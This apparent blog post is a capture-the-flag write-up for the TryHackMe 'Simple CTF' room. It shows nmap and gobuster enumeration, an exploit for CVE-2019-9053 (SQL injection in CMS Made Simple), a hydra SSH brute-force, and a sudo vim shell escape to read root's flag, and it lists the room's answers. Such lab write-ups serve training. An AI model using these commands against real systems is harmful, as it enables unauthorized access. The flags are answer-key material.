<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Simple CTF | chancej715</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Simple CTF" />
<meta name="author" content="Chance Johnson" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A beginner friendly CTF by MrSeth6797 on TryHackMe." />
<meta property="og:description" content="A beginner friendly CTF by MrSeth6797 on TryHackMe." />
<link rel="canonical" href="http://localhost:4000/writeups/2023-03-31-simple-ctf.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2023-03-31-simple-ctf.html" />
<meta property="og:site_name" content="chancej715" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-31T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Simple CTF" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Chance Johnson"},"dateModified":"2023-03-31T00:00:00-05:00","datePublished":"2023-03-31T00:00:00-05:00","description":"A beginner friendly CTF by MrSeth6797 on TryHackMe.","headline":"Simple CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2023-03-31-simple-ctf.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Chance Johnson"},"url":"http://localhost:4000/writeups/2023-03-31-simple-ctf.html"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

    <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
    <![endif]-->
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="wrapper">
      <header class="mb-5">
        
          <a href="https://chancej715.github.io"><img src="/assets/img/logo.png" alt="Logo" /></a>
        

        <p class="font-monospace mt-3 mb-0">chancej715</p>
        <p class="font-monospace mt-2 text-muted">Penetration Tester</p>
      
        <!-- Socials -->
        <a href="https://github.com/chancej715" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-github" viewBox="0 0 16 16">
            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/>
          </svg>
        </a>

        <a href="https://linkedin.com" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-linkedin" viewBox="0 0 16 16">
            <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/>
          </svg>
        </a>
        
        <a href="https://twitter.com/chancej715" target="_blank" style="text-decoration: none" class="social">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16">
            <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
          </svg>
        </a>
      </header>
      <section>

      <h1>Simple CTF</h1>
<p class="text-muted">2023-03-31</p>

<p class="view">Chance Johnson</p>

<p><a href="https://tryhackme.com/room/easyctf">Simple CTF</a> is a beginner friendly CTF on TryHackMe by MrSeth6797. I will be using Kali Linux.</p>

<h3 id="1-how-many-services-are-running-under-port-1000">1. How many services are running under port 1000?</h3>
<p>I executed the following Nmap command to scan for both UDP and TCP services on this port:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -sU -p1000 10.10.214.207
</code></pre></div></div>

<p>This tells me the following two services are running:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1000/tcp filtered      cadlock
1000/udp open|filtered ock
</code></pre></div></div>

<p><strong>Answer</strong>: 2</p>

<h3 id="2-what-is-running-on-the-higher-port">2. What is running on the higher port?</h3>
<p><a href="By default, Nmap scans the top 1,000 ports for each scan protocol requested.">By default, Nmap scans the top 1,000 ports</a>, so there’s a good chance the following command will tell me which service is listening to the highest port number:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.214.207
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
</code></pre></div></div>

<p>The scan tells us an <a href="https://en.wikipedia.org/wiki/EtherNet/IP">EtherNet/IP</a> service is listening on <code class="language-plaintext highlighter-rouge">2222/tcp</code>. Nmap uses its <a href="https://nmap.org/book/nmap-services.html"><code class="language-plaintext highlighter-rouge">nmap-services</code></a> database to determine which services correspond to which port numbers. As you probably already know, applications can be configured to listen to any desired port number. Therefore, this information is not always reliable.</p>

<p>I’ll investigate further with a version detection scan:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -p2222 10.10.214.207
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>An Nmap <a href="https://nmap.org/book/man-version-detection.html">version detection</a> scan uses the <a href="https://nmap.org/book/nmap-service-probes.html"><code class="language-plaintext highlighter-rouge">nmap-service-probes</code></a> database to determine what program is listening on a port. As you can see in the output above, Nmap has determined that an SSH server is listening on that port.</p>

<p><strong>Answer</strong>: ssh</p>

<h3 id="3-whats-thecveyoure-using-against-the-application">3. What’s the CVE you’re using against the application?</h3>
<p>At first, I used the Nmap <a href="https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse">vulners</a> script to list CVEs for the services listening on the open ports I had already discovered:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sV -sS -sU -p21,80,2222,1000 --script=vulners 10.10.214.207
</code></pre></div></div>

<p>This produced an extensive list of CVEs, so I decided to go a different route and do some more enumeration.</p>

<p>I’ll start by performing a version scan on <code class="language-plaintext highlighter-rouge">80/tcp</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -p80 10.10.214.207
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</code></pre></div></div>

<p>It appears an Apache HTTP server is listening to this port, so I will use <code class="language-plaintext highlighter-rouge">gobuster</code> to find some common directories:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.214.207/ -w /usr/share/wordlists/dirb/common.txt
</code></pre></div></div>

<p>The following resources were found:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.htpasswd
/.hta
/.htaccess
/index.html
/robots.txt
/server-status
/simple
</code></pre></div></div>

<p>I opened up Firefox and navigated to <code class="language-plaintext highlighter-rouge">http://10.10.214.207/simple</code>. It appeared to be an installation page for <a href="https://www.cmsmadesimple.org/">CMS Made Simple</a>. At the bottom of the page there was a version number: <code class="language-plaintext highlighter-rouge">2.2.8</code>.</p>

<p>A Google search for <code class="language-plaintext highlighter-rouge">cms made simple 2.2.8 cve</code> lead me to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053">CVE-2019-9053</a>.</p>

<p><strong>Answer</strong>: CVE-2019-9053</p>

<h3 id="4-to-what-kind-of-vulnerability-is-the-application-vulnerable">4. To what kind of vulnerability is the application vulnerable?</h3>
<p>CVE-2019-9053 is recorded as an SQL injection vulnerability.</p>

<p><strong>Answer</strong>: SQLi</p>

<h3 id="5-whats-the-password">5. What’s the password?</h3>
<p>I found <a href="https://github.com/e-renna/CVE-2019-9053">this</a> Python script online for exploiting the CVE. Using this script, I ran the following command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py -u http://10.10.214.207/simple/
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
</code></pre></div></div>

<p>It would appear the found password is a hash of the original password and the salt. This isn’t very useful, however it does list the username “mitch”.</p>

<p>I’ll attempt to login to that SSH server listening on <code class="language-plaintext highlighter-rouge">2222/tcp</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -s 2222 -l mitch -P /usr/share/wordlists/john.lst -t 4 10.10.214.207 ssh
</code></pre></div></div>

<p>The output of this command indicates the password is “secret”.</p>

<p><strong>Answer</strong>: secret</p>

<h3 id="6-where-can-you-login-with-the-details-obtained">6. Where can you login with the details obtained?</h3>
<p>Obviously, the SSH server.</p>

<p><strong>Answer</strong>: SSH</p>

<h3 id="7-whats-the-user-flag">7. What’s the user flag?</h3>
<p>I logged into the SSH server with the newly found credentials, and found a “user.txt” file. The contents of the file read “G00d j0b, keep up!”.</p>

<p><strong>Answer</strong>: G00d j0b, keep up!</p>

<h3 id="8-is-there-any-other-user-in-the-home-directory-whats-its-name">8. Is there any other user in the home directory? What’s its name?</h3>
<p>There was a directory named “sunbath” in the “/home” directory.</p>

<p><strong>Answer</strong>: sunbath</p>

<h3 id="9-what-can-you-leverage-to-spawn-a-privileged-shell">9. What can you leverage to spawn a privileged shell?</h3>
<p>I got stuck on this for a while. There weren’t any more files in the user’s home directory, and I wasn’t able to perform many commands as sudo. I finally remembered to list which sudo commands can be performed:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
</code></pre></div></div>

<p>It looks like I can use vim to run commands as the root user.</p>

<p><strong>Answer</strong>: vim</p>

<h3 id="10-whats-the-root-flag">10. What’s the root flag?</h3>
<p>I ran vim as sudo, and in vim I entered the following:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:!ls /root
</code></pre></div></div>

<p>This showed a <code class="language-plaintext highlighter-rouge">flag.txt</code> file. All that was left to do was print the contents of this file via vim:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:!cat /root/flag.txt
</code></pre></div></div>

<p><strong>Answer</strong>: W3ll d0n3. You made it!</p>



      </section>
    </div>
    <script src="/assets/js/scale.fix.js"></script>
  </body>
</html>
